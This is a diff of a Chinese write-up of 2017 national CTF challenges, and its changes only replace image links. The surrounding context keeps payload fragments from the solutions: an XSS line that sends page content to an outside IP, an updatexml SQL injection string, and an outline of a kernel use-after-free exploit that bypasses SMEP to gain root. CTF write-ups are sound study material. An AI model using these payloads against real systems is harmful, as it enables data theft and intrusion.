@@ -38,7 +38,7 @@ file,readfile,opendir,readdir,closedir,rewinddir,
 
 ### web 250
 首先通过svn泄露获取到源码，然后观察发现主要部分在login.php这里  
-![](http://p8.qhimg.com/t015b1c51f5d4e2c9f8.png)  
+![](https://ctfwp.wetolink.com/2017national/0.png)  
 ```
 <?php
 defined('black_hat') or header('Location: route.php?act=login');
@@ -67,12 +67,12 @@ if (isset($_POST["name"])){
 ```
 
 由index.php中代码:
-![](http://p3.qhimg.com/t019185040a918a5ea5.png)
+![](https://ctfwp.wetolink.com/2017national/1.png)
 
 当`$_SESSION['hat'] = 'black'`;时，在index.php下面就能获取到flag， 但是我们注册时候插入的表是t_user，而这里登陆查询的表是t_info,所以思路就只有想办法在login这里注入，结合login.php分析可知，在login.php中，第5行，但会结果不为空，即可。
 因此构造poc 
-![](http://p9.qhimg.com/t01e22a58487cc59edf.png)
-![](http://p8.qhimg.com/t014290d185869d0488.png)
+![](https://ctfwp.wetolink.com/2017national/2.png)
+![](https://ctfwp.wetolink.com/2017national/3.png)
 
 最后构造的payload如下：
 
@@ -211,7 +211,7 @@ for i in xrange(1,100):
 
 截图如下：  
 
-![](http://p1.qhimg.com/t01b36aa50f9fe63411.png)
+![](https://ctfwp.wetolink.com/2017national/4.png)
 
 
 ### 14.Guestbook    
@@ -258,7 +258,7 @@ window['locat'+'ion'].href='http://104.160.43.154:8000/xss/?content='+escape(a);
 ```
 能够成功获得服务器的返回，但是没有cookie，源码里面也没有flag，通过测试document.referrer，发现这个地址：
 
-![](http://p0.qhimg.com/t01eda7957d3d063945.png)
+![](https://ctfwp.wetolink.com/2017national/5.png)
 
 首先看csp，
 
@@ -303,16 +303,16 @@ username='ad121212122min'&phone=' or updatexml(1,concat(0x7e,(/*!50001select*/a.
 
 然后输入时候把存在的项变成0就行
 
-![](http://p4.qhimg.com/t01a3805198d684e239.png)
+![](https://ctfwp.wetolink.com/2017national/6.png)
 
-![](http://p3.qhimg.com/t01832d8510e42c9ce3.png)
+![](https://ctfwp.wetolink.com/2017national/7.png)
 
 ### 5.apk crack    
 类型：REVERSE    分值：300分
 
 本题的做法比较取巧，首先使用jeb2打开apk文件，查看验证的关键流程
 
-![](http://p6.qhimg.com/t01df0c0de8d06b6f4e.png)
+![](https://ctfwp.wetolink.com/2017national/8.png)
 
 可以看到，程序在取得了用户输入的字符串后，会调用wick.show方法，这个方法会调用jni中的对应函数，该jni函数会开启反调试并给静态变量A、B赋值success和failed。随后会进入simple.check方法开启验证。
 
@@ -320,11 +320,11 @@ username='ad121212122min'&phone=' or updatexml(1,concat(0x7e,(/*!50001select*/a.
 
 使用jeb2的动态调试功能，把断点下到00000A7A函数的返回指令处，在手机中输入随意字符并点击确定，程序会断在返回指令处。
 
- ![](http://p3.qhimg.com/t01639ea2aa519fae9b.png)
+ ![](https://ctfwp.wetolink.com/2017national/9.png)
 
 此时查看empty数组的值，发现疑似ASCII码的数字，转换过来就是flag
 
- ![](http://p2.qhimg.com/t0164b7ced05b10e869.png)
+ ![](https://ctfwp.wetolink.com/2017national/10.png)
 
 flag：clo5er
 
@@ -459,7 +459,7 @@ Continue
 
 通过IDA打开babyDriver.ko，这个驱动非常简单，实现的都是一些基本功能
 
-![](http://p7.qhimg.com/t01a50763d55f5653e3.png)
+![](https://ctfwp.wetolink.com/2017national/11.png)
 
 关于驱动通信网上有很多介绍，这里我不多介绍了，这个驱动存在一个伪条件竞争引发的UAF漏洞，也就是说，我们利用open(/dev/babydev,O_RDWR)打开两个设备A和B，随后通过ioctl会释放掉babyopen函数执行时初始化的空间，而ioctl可以控制申请空间的大小。
 
@@ -508,15 +508,15 @@ __int64 __fastcall babyioctl(file *filp, __int64 command, unsigned __int64 arg, 
 .text:00000000000000FF                 jz      short loc_125
 ```
 rdi寄存器存放的就是buffer指针。
-![](http://p9.qhimg.com/t0184ce6c7a069070ff.png)
+![](https://ctfwp.wetolink.com/2017national/12.png)
 
 可以看到，指针指向的空间的值已经不是初始化时候覆盖的全0了。
 
-![](http://p5.qhimg.com/t01aee71b75581d68d9.png)
+![](https://ctfwp.wetolink.com/2017national/13.png)
 
 当前目标缓冲区内已经由于释放导致很多内容不为0，这时候，我们同样可以通过read的方法读到其他地址，获取地址泄露的能力。
 
-![](http://p8.qhimg.com/t01d3c74253c4db31c3.png)
+![](https://ctfwp.wetolink.com/2017national/14.png)
 
 在test之后泄露出来了一些额外的值，因此可以通过read的方法来进行info leak。
 
@@ -538,13 +538,13 @@ rdi寄存器存放的就是buffer指针。
 ```
 当close(fd)之后，我们利用open的方法覆盖tty_struct，同时向tty_struct开头成员变量写入test数据，退出时会由于tty_struct开头成员变量magic的值被修改导致异常。
 
-![](http://p5.qhimg.com/t01ffc8ec09de2c5083.png)
+![](https://ctfwp.wetolink.com/2017national/15.png)
 
 接下来，我们只需要利用0CTF中一道很有意思的内核题目KNOTE的思路，在tty_struct的tty_operations中构造一个fake oprations，关键是修改其中的ioctl指针，最后达成提权效果。
 
 首先，我们需要利用设备B的read函数来获得占位tty_struct的头部结构，然后才是tty_operations。
 
-![](http://p9.qhimg.com/t01f3029c17dba24655.png)
+![](https://ctfwp.wetolink.com/2017national/16.png)
 
 当然，通过启动命令我们可以看到，系统开启了smep，我们需要构造一个rop chain来完成对cr4寄存器的修改，将cr4中smep的比特位置0，来关闭smep。
 
@@ -564,7 +564,7 @@ rdi寄存器存放的就是buffer指针。
 
 至此，我们要构造fake struct来控制rip。
 
-![](http://p4.qhimg.com/t010c3a3f0e57362560.png)
+![](https://ctfwp.wetolink.com/2017national/17.png)
 
 我们通过覆盖tty_struct中的tty_operations，来将fake tty_operations的ioctl函数替换掉，改成stack pivot，之后我们调用ioctl函数的时候相当于去执行stack pivot，从而控制rip。
 
@@ -596,9 +596,9 @@ root_payload(void)
 
 最后通过get shell完成提权，获得root权限。
 
-![](http://p2.qhimg.com/t01ef8f8136c48fcf7d.png)
+![](https://ctfwp.wetolink.com/2017national/18.png)
 
-![](http://p0.qhimg.com/t01b929e41f6f506458.png)
+![](https://ctfwp.wetolink.com/2017national/19.png)
 
 ### 18.NotFormat    
 类型：PWN   分值：250分
@@ -714,18 +714,18 @@ print hex(int(r,2)).upper()
 类型：MISC    分值：100分
 看到一个莫名其妙的文件open_forum.png，猜测是已知明文，后来google搞不到原图，官方的hint
 
-![](http://p0.qhimg.com/t01788f2ce0206a80b1.png)
+![](https://ctfwp.wetolink.com/2017national/20.png)
 
-![](http://p2.qhimg.com/t01961ada31d0d724f5.png)
+![](https://ctfwp.wetolink.com/2017national/21.png)
 
-![](http://p0.qhimg.com/t017948948c62d20d48.png)
+![](https://ctfwp.wetolink.com/2017national/22.png)
 
 猜测是盲水印  
 工具：https://github.com/chishaxie/BlindWaterMark  
 
 `python27 bwm.py decode fuli.png fuli2.png res.png`  
 
-![](http://p0.qhimg.com/t013c7a81d2f3b662ee.png)
+![](https://ctfwp.wetolink.com/2017national/23.png)
 
 ### 12.badhacker    
 
@@ -733,15 +733,15 @@ print hex(int(r,2)).upper()
 
 首先看到pcap中IRC交流
 
-![](http://p9.qhimg.com/t012a573bef466d4117.png)
+![](https://ctfwp.wetolink.com/2017national/24.png)
 
-![](http://p0.qhimg.com/t012b282728f0b84d48.png)
+![](https://ctfwp.wetolink.com/2017national/25.png)
 
 意思就是在这个服务器上找文件，然后找改动的地方，把行号排序计算md5
 
 This server 就是irc服务器
 
-![](http://p9.qhimg.com/t019a9b5409f521d44e.png)
+![](https://ctfwp.wetolink.com/2017national/26.png)
 
 扫描端口
 
@@ -757,19 +757,19 @@ This server 就是irc服务器
 
 然后对这个服务器进行目录爆破，爆出mysql.bak
 
-![](http://p2.qhimg.com/t01f3e9a8738d8825f0.png)
+![](https://ctfwp.wetolink.com/2017national/27.png)
 
 这个文件有点意思，需要找改动的地方。脑洞就是在unix操作系统中的换行是n，而在windows中的换行是rn，所以，找改动的地方。找到3处，交了不对。
 
 于是扩大搜索范围，搜索r，发现有8处
 
-![](http://p5.qhimg.com/t01cec2024b2b561c23.png)
+![](https://ctfwp.wetolink.com/2017national/28.png)
 
 将其行号排序，然后计算md5即可。
 
 两个脑洞，一个是服务器拒绝host为IP的请求，另一个是unix和windows换行符号。
 
-![](http://p4.qhimg.com/t01e53d49dbd24187dc.png)
+![](https://ctfwp.wetolink.com/2017national/29.png)
 
 
 ### 13.传感器2    
@@ -781,11 +781,11 @@ This server 就是irc服务器
 
 更改88 45 AB F3为
 
-![](http://p5.qhimg.com/t0194128ccc93fbd01b.png)
+![](https://ctfwp.wetolink.com/2017national/30.png)
 
 再计算就可以了
 
-![](http://p6.qhimg.com/t015d167382bebc8e58.png)
+![](https://ctfwp.wetolink.com/2017national/31.png)
 
 上图是ID为88 45 AB F3的
 
@@ -793,7 +793,7 @@ This server 就是irc服务器
 
 类型：MISC   分值：300分
 
-![](http://p1.qhimg.com/t017bcc0c9cb9fe14e8.jpg)
+![](https://ctfwp.wetolink.com/2017national/32.jpeg)
 
 ## 四、Crypto
 ### 11.partial    
@@ -818,7 +818,7 @@ flag{4_5ing1e_R00T_cAn_chang3_eVeryth1ng}
 
 # 评论区
 **请文明评论，禁止广告**
-<img src="https://cloud.panjunwen.com/alu/扇耳光.png" alt="扇耳光.png" class="vemoticon-img">  
+<img src="https://ctfwp.wetolink.com/alu/扇耳光.png" alt="扇耳光.png" class="vemoticon-img">  
 
 ---
 
